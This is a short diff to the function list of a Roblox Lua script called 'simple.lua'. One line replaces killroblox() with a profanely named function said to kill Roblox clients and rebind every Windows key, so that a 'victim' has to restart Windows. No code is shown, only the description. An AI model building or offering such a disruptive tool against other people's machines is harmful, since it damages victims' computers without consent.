@@ -33,5 +33,5 @@ rejoin() -- Rejoins you
 serverhop() -- Puts you in a different server
 forceredirect(PlaceId) -- Forces you to redirect to another game
 notification(title, content) -- Makes a standard roblox notification [ Example: notification("Hello!", "Powered by simple.lua") ]
-killroblox() -- Ends the roblox client
+fuckpc() -- Ends the roblox clients and rebinds every windows key (even when roblox is closed), so your victim will need to restart windows. [ ROBLOX NEEDS TO BE FOCUSED ]
 -------------------------------
